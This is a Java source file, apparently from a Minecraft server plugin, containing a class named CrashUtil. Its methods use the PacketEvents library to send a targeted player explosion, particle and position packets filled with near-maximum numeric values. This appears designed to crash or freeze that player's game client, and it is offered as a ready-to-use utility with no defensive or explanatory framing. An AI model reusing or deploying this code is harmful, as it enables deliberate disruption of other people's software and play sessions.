package dev.ethan.useful.utils;

import com.github.retrooper.packetevents.protocol.particle.Particle;
import com.github.retrooper.packetevents.protocol.particle.type.ParticleTypes;
import com.github.retrooper.packetevents.protocol.player.User;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3f;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerExplosion;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerParticle;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerPlayerPositionAndLook;

import java.util.Collections;

public class CrashUtil {
    public double d() {
        double x = Math.random();
        return Double.MAX_VALUE * ((x * (((Math.sqrt(x) * 564 % 1) * 0.75) - (Math.pow(x, 2) % 1) * 0.5)) + 0.5);
    }

    public float f() {
        double x = Math.random();
        return Float.MAX_VALUE * ((float) ((x * (((Math.sqrt(x) * 564 % 1) * 0.75) - (Math.pow(x, 2) % 1) * 0.5)) + 0.5));
    }

    public int i() {
        double x = Math.random();
        return (int) (Integer.MAX_VALUE * ((x * (((Math.sqrt(x) * 564 % 1) * 0.75) - (Math.pow(x, 2) % 1) * 0.5)) + 0.5));
    }

    public int b() {
        double x = Math.random();
        return (int) (Byte.MAX_VALUE * ((x * (((Math.sqrt(x) * 564 % 1) * 0.75) - (Math.pow(x, 2) % 1) * 0.5)) + 0.5));
    }

    public void sendExplosion(User user) {
        user.sendPacket(new WrapperPlayServerExplosion(
                new Vector3d(d(), d(), d()),
                f(),
                Collections.emptyList(),
                new Vector3f(f(), f(), f())
        ));
    }

    public void sendParticle(User user) {
        user.sendPacket(new WrapperPlayServerParticle(
                new Particle<>(ParticleTypes.DRAGON_BREATH),
                true,
                new Vector3d(d(), d(), d()),
                new Vector3f(f(), f(), f()),
                f(),
                i()
        ));
    }

    public void sendPosition(User user) {
        user.sendPacket(new WrapperPlayServerPlayerPositionAndLook(
                d(), d(), d(),
                f(), f(),
                (byte) b(),
                i(),
                false
        ));
    }
}
